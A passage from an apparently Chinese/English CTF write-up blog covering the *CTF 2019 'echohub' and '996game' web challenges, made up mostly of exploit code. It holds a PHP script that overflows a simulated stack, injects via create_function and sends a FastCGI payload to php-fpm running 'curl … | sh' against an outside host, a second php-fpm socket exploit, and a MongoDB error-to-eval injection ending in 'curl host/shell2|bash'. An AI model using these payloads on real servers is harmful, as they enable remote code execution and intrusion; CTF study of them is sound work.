class="line">$plt = array_flip($func_);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">handle_data</span><span class="params">($data)</span> </span>&#123;</span><br><span class="line">$len = strlen($data);</span><br><span class="line">$a = $len / <span class="number">0x4</span> + <span class="number">0x1</span> * ($len % <span class="number">0x4</span>);</span><br><span class="line">$ret = str_split($data, <span class="number">0x4</span>);</span><br><span class="line">$ret[$a - <span class="number">0x1</span>] = str_pad($ret[$a - <span class="number">0x1</span>], <span class="number">0x4</span>, <span class="string">"\x00"</span>);</span><br><span class="line"><span class="keyword">foreach</span> ($ret <span class="keyword">as</span> $key =&gt; &amp;$value) &#123;</span><br><span class="line">$value = strrev(bin2hex($value));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> $ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">gen_canary</span><span class="params">()</span> </span>&#123;</span><br><span class="line">$canary = <span class="string">'abcdefghijklmnopqrstuvwxyzABCDEFGHJKLMNPQEST123456789'</span>;</span><br><span class="line">$a = $canary[rand(<span class="number">0</span>, strlen($canary) - <span class="number">0x1</span>)];</span><br><span class="line">$b = $canary[rand(<span class="number">0</span>, strlen($canary) - <span class="number">0x1</span>)];</span><br><span class="line">$c = $canary[rand(<span class="number">0</span>, strlen($canary) - <span class="number">0x1</span>)];</span><br><span class="line">$d = <span class="string">"\x00"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> handle_data($a . $b . $c . $d)[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$canary = gen_canary();</span><br><span class="line">$canarycheck = $canary;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_canary</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">global</span> $canary;</span><br><span class="line"><span class="keyword">global</span> $canarycheck;</span><br><span class="line"><span class="keyword">if</span> ($canary != $canarycheck) &#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">'emmmmmm...Don\'t attack me!'</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">stack</span> </span>&#123;</span><br><span class="line"><span class="keyword">public</span> $ebp, $stack, $esp;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($a, $b)</span> </span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;stack = <span class="keyword">array</span>();</span><br><span class="line"><span class="keyword">global</span> $regs;</span><br><span class="line"><span class="keyword">$this</span>-&gt;ebp = &amp;$regs[<span class="string">'ebp'</span>];</span><br><span class="line"><span class="keyword">$this</span>-&gt;esp = &amp;$regs[<span class="string">'esp'</span>];</span><br><span class="line"><span class="keyword">$this</span>-&gt;ebp = <span class="number">0xfffe0000</span> + rand(<span class="number">0x0</span>, <span class="number">0xffff</span>);</span><br><span class="line"><span class="keyword">global</span> $canary;</span><br><span class="line"><span class="keyword">$this</span>-&gt;stack[<span class="keyword">$this</span>-&gt;ebp - <span class="number">0x4</span>] = &amp;$canary;</span><br><span class="line"><span class="keyword">$this</span>-&gt;canary = $canary;</span><br><span class="line"><span class="keyword">$this</span>-&gt;stack[<span class="keyword">$this</span>-&gt;ebp] = <span class="keyword">$this</span>-&gt;ebp + rand(<span class="number">0x0</span>, <span class="number">0xffff</span>);</span><br><span class="line"><span class="keyword">$this</span>-&gt;esp = <span class="keyword">$this</span>-&gt;ebp - rand(<span class="number">0x20</span>, <span class="number">0x60</span>) * <span class="number">0x4</span>;</span><br><span class="line"><span class="keyword">$this</span>-&gt;stack[<span class="keyword">$this</span>-&gt;ebp + <span class="number">0x4</span>] = dechex($a);</span><br><span class="line"><span class="keyword">if</span> ($b != <span class="keyword">null</span>) &#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;pushdata($b);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">pushdata</span><span class="params">($data)</span> </span>&#123;</span><br><span class="line">$data_bak = $data;</span><br><span class="line">$data = handle_data($data);</span><br><span class="line"><span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; count($data); $i++) &#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;stack[<span class="keyword">$this</span>-&gt;esp + $i * <span class="number">0x4</span>] = $data[$i];</span><br><span class="line"><span class="comment">//no args in my stack haha</span></span><br><span class="line">check_canary();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">recover_data</span><span class="params">($data)</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> hex2bin(strrev($data));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">outputdata</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">global</span> $regs;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'root says: '</span>;</span><br><span class="line"><span class="keyword">while</span> (<span class="number">0x1</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;esp == <span class="keyword">$this</span>-&gt;ebp - <span class="number">0x4</span>) &#123;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">$this</span>-&gt;pop(<span class="string">'eax'</span>);</span><br><span class="line">$data = <span class="keyword">$this</span>-&gt;recover_data($regs[<span class="string">'eax'</span>]);</span><br><span class="line">$ret = explode(<span class="string">"\x00"</span>, $data);</span><br><span class="line"><span class="keyword">echo</span> $ret[<span class="number">0</span>];</span><br><span class="line"><span class="keyword">if</span> (count($ret) &gt; <span class="number">0x1</span>) &#123;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">ret</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;esp = <span class="keyword">$this</span>-&gt;ebp;</span><br><span class="line"><span class="keyword">$this</span>-&gt;pop(<span class="string">'ebp'</span>);</span><br><span class="line"><span class="keyword">$this</span>-&gt;pop(<span class="string">'eip'</span>);</span><br><span class="line"><span class="keyword">$this</span>-&gt;call();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_data_from_reg</span><span class="params">($item)</span> </span>&#123;</span><br><span class="line"><span class="keyword">global</span> $regs;</span><br><span class="line">$a = <span class="keyword">$this</span>-&gt;recover_data($regs[$item]);</span><br><span class="line">$b = explode(<span class="string">"\x00"</span>, $a);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> $b[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">call</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">global</span> $regs;</span><br><span class="line"><span class="keyword">global</span> $plt;</span><br><span class="line">$a = hexdec($regs[<span class="string">'eip'</span>]);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_REQUEST[$a])) &#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;pop(<span class="string">'eax'</span>);</span><br><span class="line">$len = (int) <span class="keyword">$this</span>-&gt;get_data_from_reg(<span class="string">'eax'</span>);</span><br><span class="line">$args = <span class="keyword">array</span>();</span><br><span class="line"><span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; $len; $i++) &#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;pop(<span class="string">'eax'</span>);</span><br><span class="line">$data = <span class="keyword">$this</span>-&gt;get_data_from_reg(<span class="string">'eax'</span>);</span><br><span class="line">array_push($args, $_REQUEST[$data]);</span><br><span class="line">&#125;</span><br><span class="line">call_user_func_array($plt[$a], $args);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">call_user_func($plt[$a]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">push</span><span class="params">($item)</span> </span>&#123;</span><br><span class="line"><span class="keyword">global</span> $regs;</span><br><span class="line">$data = $regs[$item];</span><br><span class="line"><span class="keyword">if</span> (hex2bin(strrev($data)) == <span class="keyword">null</span>) &#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">'data error'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">$this</span>-&gt;stack[<span class="keyword">$this</span>-&gt;esp] = $data;</span><br><span class="line"><span class="keyword">$this</span>-&gt;esp -= <span class="number">0x4</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">pop</span><span class="params">($item)</span> </span>&#123;</span><br><span class="line"><span class="keyword">global</span> $regs;</span><br><span class="line">$regs[$item] = <span class="keyword">$this</span>-&gt;stack[<span class="keyword">$this</span>-&gt;esp];</span><br><span class="line"><span class="keyword">$this</span>-&gt;esp += <span class="number">0x4</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($name, $args)</span> </span>&#123;</span><br><span class="line">check_canary();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hexToStr</span><span class="params">($hex)</span> </span>&#123;</span><br><span class="line">$str = <span class="string">""</span>;</span><br><span class="line"><span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; strlen($hex) - <span class="number">1</span>; $i += <span class="number">2</span>) &#123;</span><br><span class="line">$str .= chr(hexdec($hex[$i] . $hex[$i + <span class="number">1</span>]));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> $str;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">_httpPost</span><span class="params">($url = <span class="string">""</span>, $requestData = array<span class="params">()</span>)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">$curl = curl_init();</span><br><span class="line"><span class="comment">#curl_setopt( $curl, CURLOPT_PROXY, "127.0.0.1:8080" );</span></span><br><span class="line">curl_setopt($curl, CURLOPT_URL, $url);</span><br><span class="line">curl_setopt($curl, CURLOPT_RETURNTRANSFER, <span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//普通数据</span></span><br><span class="line">curl_setopt($curl, CURLOPT_POSTFIELDS, http_build_query($requestData));</span><br><span class="line">$res = curl_exec($curl);</span><br><span class="line"></span><br><span class="line"><span class="comment">//$info = curl_getinfo($ch);</span></span><br><span class="line">curl_close($curl);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> $res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$phpinfo_addr = array_search(<span class="string">'phpinfo'</span>, $plt);</span><br><span class="line">$gets = <span class="string">'zeroyu'</span>;</span><br><span class="line">$main_stack1 = <span class="keyword">new</span> stack($phpinfo_addr, $gets);</span><br><span class="line">$ebp = $main_stack1-&gt;ebp;</span><br><span class="line">$esp = $main_stack1-&gt;esp;</span><br><span class="line">$padding_num = ($main_stack1-&gt;ebp - $main_stack1-&gt;esp) - <span class="number">4</span>;</span><br><span class="line"></span><br><span class="line">$shellcode = <span class="string">'&#125;echo "pwned&lt;br&gt;";$fp = stream_socket_client("unix:///run/php/php7.3-fpm.sock", $errno, $errstr,30);$out = urldecode("%01%01%99%E6%00%08%00%00%00%01%00%00%00%00%00%00%01%04%99%E6%01%DB%00%00%0E%02CONTENT_LENGTH73%0C%10CONTENT_TYPEapplication/text%0B%04REMOTE_PORT9985%0B%09SERVER_NAMElocalhost%11%0BGATEWAY_INTERFACEFastCGI/1.0%0F%0ESERVER_SOFTWAREphp/fcgiclient%0B%09REMOTE_ADDR127.0.0.1%0F%17SCRIPT_FILENAME/var/www/html/index.php%0B%17SCRIPT_NAME/var/www/html/index.php%09%1FPHP_VALUEauto_prepend_file%20%3D%20php%3A//input%0E%04REQUEST_METHODPOST%0B%02SERVER_PORT80%0F%08SERVER_PROTOCOLHTTP/1.1%0C%00QUERY_STRING%0F%16PHP_ADMIN_VALUEallow_url_include%20%3D%20On%0D%01DOCUMENT_ROOT/%0B%09SERVER_ADDR127.0.0.1%0B%17REQUEST_URI/var/www/html/index.php%01%04%99%E6%00%00%00%00%01%05%99%E6%00I%00%00%3C%3Fphp%20system%28%27curl%20http%3A//ebcece08.w1n.pw/getflag%20%7C%20sh%27%29%3Bdie%28%27zeroyu%27%29%3B%3F%3E%01%05%99%E6%00%00%00%00");stream_socket_sendto($fp,$out);while (!feof($fp)) &#123;echo htmlspecialchars(fgets($fp, 10)); &#125;fclose($fp);//'</span>;</span><br><span class="line"></span><br><span class="line">$post_data = <span class="keyword">array</span>();</span><br><span class="line">$data = str_repeat(<span class="string">'A'</span>, $padding_num) . hexToStr(strrev($canarycheck)) . <span class="string">"BBBB"</span> . hexToStr(strrev(dechex($func_[<span class="string">'create_function'</span>]))) . <span class="string">'000266667777'</span>;</span><br><span class="line">$post_data[<span class="string">'data'</span>] = $data;</span><br><span class="line">$post_data[$func_[<span class="string">'create_function'</span>]] = <span class="string">'zeroyu'</span>;</span><br><span class="line">$post_data[<span class="string">'6666'</span>] = <span class="string">''</span>;</span><br><span class="line">$post_data[<span class="string">'7777'</span>] = $shellcode;</span><br><span class="line"></span><br><span class="line">$rs = _httpPost(<span class="string">"http://47.90.204.28:10080/"</span>, $post_data);</span><br><span class="line"><span class="keyword">echo</span> $rs;</span><br></pre></td></tr></table></figure><p>rr的exp<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a=stream_socket_client(<span class="string">"unix:///run/php/php7.3-fpm.sock"</span>);</span><br><span class="line">fputs($a, urldecode(<span class="string">"%01%01R%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04R%01%01%DC%00%00%0E%03CONTENT_LENGTH697%0C%10CONTENT_TYPEapplication/text%0B%04REMOTE_PORT9985%0B%09SERVER_NAMElocalhost%11%0BGATEWAY_INTERFACEFastCGI/1.0%0F%0ESERVER_SOFTWAREphp/fcgiclient%0B%09REMOTE_ADDR127.0.0.1%0F%17SCRIPT_FILENAME/var/www/html/index.php%0B%17SCRIPT_NAME/var/www/html/index.php%09%1FPHP_VALUEauto_prepend_file%20%3D%20php%3A//input%0E%04REQUEST_METHODPOST%0B%02SERVER_PORT80%0F%08SERVER_PROTOCOLHTTP/1.1%0C%00QUERY_STRING%0F%16PHP_ADMIN_VALUEallow_url_include%20%3D%20On%0D%01DOCUMENT_ROOT/%0B%09SERVER_ADDR127.0.0.1%0B%17REQUEST_URI/var/www/html/index.php%01%04R%01%00%00%00%00%01%05R%01%02%B9%00%00%3C%3Fphp%0A%24descriptorspec%20%3D%20array%28%0A%20%20%200%20%3D%3E%20array%28%22pipe%22%2C%20%22r%22%29%2C%0A%20%20%201%20%3D%3E%20array%28%22pipe%22%2C%20%22w%22%29%2C%0A%20%20%202%20%3D%3E%20array%28%22pipe%22%2C%20%22w%22%29%0A%29%3B%0A%0A%24cwd%20%3D%20%27/%27%3B%0A%24env%20%3D%20array%28%29%3B%0A%0A%24process%20%3D%20proc_open%28%27/readflag%27%2C%20%24descriptorspec%2C%20%24pipes%2C%20%24cwd%2C%20%24env%29%3B%0A%0Aif%20%28is_resource%28%24process%29%29%20%7B%0A%20%20%20%20%24a%20%3D%20fread%28%24pipes%5B1%5D%2C%201024%29%3B%0A%20%20%20%20%24a%20%3D%20fread%28%24pipes%5B1%5D%2C%201024%29%3B%0A%0A%20%20%20%20%24a%20%3D%20explode%28%22%5Cn%22%2C%20%24a%29%3B%0A%20%20%20%20eval%28%22%5C%24result%20%3D%20%24a%5B0%5D%3B%22%29%3B%0A%20%20%20%20echo%28%22%5C%24result%20%3D%20%24a%5B0%5D%3B%22%29%3B%0A%0A%20%20%20%20fwrite%28%24pipes%5B0%5D%2C%20%22%24result%5Cn%22%29%3B%0A%0A%20%20%20%20var_dump%28fread%28%24pipes%5B1%5D%2C%201024%29%29%3B%0A%20%20%20%20var_dump%28fread%28%24pipes%5B1%5D%2C%201024%29%29%3B%0A%20%20%20%20var_dump%28fread%28%24pipes%5B1%5D%2C%201024%29%29%3B%0A%0A%20%20%20%20fclose%28%24pipes%5B0%5D%29%3B%0A%20%20%20%20fclose%28%24pipes%5B1%5D%29%3B%0A%20%20%20%20%24return_value%20%3D%20proc_close%28%24process%29%3B%0A%0A%20%20%20%20echo%20%22command%20returned%20%24return_value%5Cn%22%3B%0A%7D%0A%3F%3E%01%05R%01%00%00%00%00"</span>));</span><br><span class="line">var_dump(fgets($a, <span class="number">1024</span>));</span><br><span class="line">var_dump(fgets($a, <span class="number">1024</span>));</span><br><span class="line">var_dump(fgets($a, <span class="number">1024</span>));</span><br><span class="line">var_dump(fgets($a, <span class="number">1024</span>));</span><br><span class="line">var_dump(fgets($a, <span class="number">1024</span>));</span><br></pre></td></tr></table></figure></p><h4 id="6-参考"><a href="#6-参考" class="headerlink" title="6.参考"></a>6.参考</h4><p><a href="https://github.com/sixstars/starctf2019/blob/7e8bd4efbef03ed2b6a6bea2a01befc6374dde9e/web-echohub/readme.md" target="_blank" rel="noopener">《Echohub 官方》</a></p><p><a href="https://xz.aliyun.com/t/5006#toc-3" target="_blank" rel="noopener">《ROIS *CTF2019 Writeup》</a></p><p><a href="https://www.secpulse.com/archives/105333.html" target="_blank" rel="noopener">《CTF 2019 Mywebsql Echohub WriteUp》</a></p><p><a href="https://evoa.me/index.php/archives/52/" target="_blank" rel="noopener">《PHP 连接方式&amp;攻击PHP-FPM&amp;*CTF echohub WP》</a></p><p><a href="https://mochazz.github.io/2019/05/03/2019%E6%98%9FCTF%E4%B9%8BWeb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/" target="_blank" rel="noopener">《2019星CTF之Web部分题解》</a></p><h3 id="3-996game"><a href="#3-996game" class="headerlink" title="3. 996game"></a>3. 996game</h3><h4 id="OrZ"><a href="#OrZ" class="headerlink" title="OrZ"></a>OrZ</h4><p>This challenge is temporarily made in the afternoon before the CTF game(From findding bugs to challenges). So there are some rushes in this challenge , please bear with me.</p><h4 id="writeup"><a href="#writeup" class="headerlink" title="writeup"></a>writeup</h4><p>First we can find hint from HTML source code.</p><p><img src="https://i.imgur.com/yCKELtI.png" alt></p><p>It’s an open-source HTML5 game. </p><p><a href="https://github.com/Jerenaux/phaserquest" target="_blank" rel="noopener">https://github.com/Jerenaux/phaserquest</a></p><p>We can see there is a static file leak vulnerability</p><p><a href="https://github.com/Jerenaux/phaserquest/blob/master/server.js#L44" target="_blank" rel="noopener">https://github.com/Jerenaux/phaserquest/blob/master/server.js#L44</a></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">app.use(<span class="string">'/css'</span>,express.static(__dirname + <span class="string">'/css'</span>));</span><br><span class="line">app.use(<span class="string">'/js'</span>,express.static(__dirname + <span class="string">'/js'</span>));</span><br><span class="line">app.use(<span class="string">'/assets'</span>,express.static(__dirname + <span class="string">'/assets'</span>));</span><br></pre></td></tr></table></figure><p>生成器函数express.static会生成一个中间件函数。该中间件响应请求的方法，是将传递给生成器函数的参数视作一个目录，并尝试在其中寻找能与请求URL相匹配的文件。如果文件路径存在，就将文件的内容作为响应返回；如果不存在，就执行中间件链条上的下一个函数。中间件是通过应用的use()方法挂在到应用上的。</p><p>对比源代码可以迅速发现一个eval函数</p><p><img src="https://i.loli.net/2019/09/15/dLNRmZKgFBSw4p1.png" alt="5C91C1D6-DA0C-4A0C-A5EF-ADCD922BBC3F.png"></p><p><img src="https://i.imgur.com/2isT1nn.png" alt></p><p>这里当查询 mongodb 报错时，会把报错信息 err.message 带入 eval 中，所以只要报错信息可控就可以造成任意代码执行。</p><p>Now, we need to find a way to get mongodb error.</p><p>此处我们直接进docker中看一下mongo的错误点</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker exec -it source_mongo_1 /bin/bash</span><br></pre></td></tr></table></figure><p>进入mongo的shell查询一下对象<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&gt; show dbs</span><br><span class="line">admin        0.000GB</span><br><span class="line">local        0.000GB</span><br><span class="line">phaserQuest  0.000GB</span><br><span class="line">&gt; use phaserQuest</span><br><span class="line">switched to db phaserQuest</span><br><span class="line">&gt; db</span><br><span class="line">phaserQuest</span><br><span class="line">&gt; show tables</span><br><span class="line">players</span><br><span class="line">&gt; db.playsers.find(&#123;_id:&#123;&apos;$a=1;&apos;:&quot;&quot;&#125;&#125;)</span><br><span class="line">Error: error: &#123;</span><br><span class="line">&quot;ok&quot; : 0,</span><br><span class="line">&quot;errmsg&quot; : &quot;unknown operator: $a=1;&quot;,</span><br><span class="line">&quot;code&quot; : 2,</span><br><span class="line">&quot;codeName&quot; : &quot;BadValue&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>可以看到查表时当条件是一个 JSON 且键名以$开头时 mongodb 就会报错，还会把键名输出到 errmsg 中。但是此处 id 还经过了 new ObjectId() 对象，因此</p><p>Only one thing we can control is id, so we can track the <code>ObjectId()</code> function.</p><p><a href="https://github.com/mongodb/js-bson/blob/V1.0.4/lib/bson/objectid.js#L28" target="_blank" rel="noopener">https://github.com/mongodb/js-bson/blob/V1.0.4/lib/bson/objectid.js#L28</a></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> valid = ObjectID.isValid(id);</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">ObjectID.isValid = <span class="function"><span class="keyword">function</span> <span class="title">isValid</span>(<span class="params">id</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(id == <span class="literal">null</span>) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(<span class="keyword">typeof</span> id == <span class="string">'number'</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(<span class="keyword">typeof</span> id == <span class="string">'string'</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> id.length == <span class="number">12</span> || (id.length == <span class="number">24</span> &amp;&amp; checkForHexRegExp.test(id));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(id <span class="keyword">instanceof</span> ObjectID) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(id <span class="keyword">instanceof</span> _Buffer) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Duck-Typing detection of ObjectId like objects</span></span><br><span class="line">  <span class="keyword">if</span>(id.toHexString) &#123;</span><br><span class="line">    <span class="keyword">return</span> id.id.length == <span class="number">12</span> || (id.id.length == <span class="number">24</span> &amp;&amp; checkForHexRegExp.test(id.id));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>Now we can use <code>id = {&quot;id&quot;:{&quot;length&quot;:12}}</code> bypass it.</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(!valid &amp;&amp; id != <span class="literal">null</span>)&#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">"Argument passed in must be a single String of 12 bytes or a string of 24 hex characters"</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>(valid &amp;&amp; <span class="keyword">typeof</span> id == <span class="string">'string'</span> &amp;&amp; id.length == <span class="number">24</span> &amp;&amp; hasBufferType) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> ObjectID(<span class="keyword">new</span> Buffer(id, <span class="string">'hex'</span>));</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>(valid &amp;&amp; <span class="keyword">typeof</span> id == <span class="string">'string'</span> &amp;&amp; id.length == <span class="number">24</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> ObjectID.createFromHexString(id);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>(id != <span class="literal">null</span> &amp;&amp; id.length === <span class="number">12</span>) &#123;</span><br><span class="line">    <span class="comment">// assume 12 byte string</span></span><br><span class="line">    <span class="keyword">this</span>.id = id;</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>(id != <span class="literal">null</span> &amp;&amp; id.toHexString) &#123;</span><br><span class="line">    <span class="comment">// Duck-typing to support ObjectId from different npm packages</span></span><br><span class="line">    <span class="keyword">return</span> id;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">"Argument passed in must be a single String of 12 bytes or a string of 24 hex characters"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>Now , we change our payload to<br><code>id = {&quot;length&quot;:0,&quot;toHexString&quot;:true,&quot;id&quot;:{&quot;length&quot;:12}},</code></p><p>And then the whole payload will be sent to mongodb server.</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">MongoDB shell version: <span class="number">2.6</span><span class="number">.10</span></span><br><span class="line">connecting to: test</span><br><span class="line">&gt; db.a.find(&#123;<span class="string">"b"</span>:&#123;<span class="string">"$gt"</span>:<span class="number">1</span>,<span class="string">"c"</span>:<span class="string">"d"</span>&#125;&#125;)</span><br><span class="line">error: &#123;</span><br><span class="line"><span class="string">"$err"</span> : <span class="string">"Can't canonicalize query: BadValue unknown operator: c"</span>,</span><br><span class="line"><span class="string">"code"</span> : <span class="number">17287</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>So the whole exploit is</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Client.socket.emit(<span class="string">'init-world'</span>,&#123;<span class="attr">new</span>:<span class="literal">false</span>,<span class="attr">id</span>:&#123;<span class="string">"$in"</span>:[<span class="number">1</span>],<span class="string">"require('child_process').exec('/usr/bin/curl host/shell2|bash')"</span>:<span class="string">"bbb"</span>,<span class="string">"length"</span>:<span class="number">0</span>,<span class="string">"toHexString"</span>:<span class="literal">true</span>,<span class="string">"id"</span>:&#123;<span class="string">"length"</span>:<span class="number">12</span>&#125;&#125;,<span class="attr">clientTime</span>:<span class="string">"sacsaccsacsac"</span>&#125;);</span><br></pre></td></tr></table></figure><p>RR的exp</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 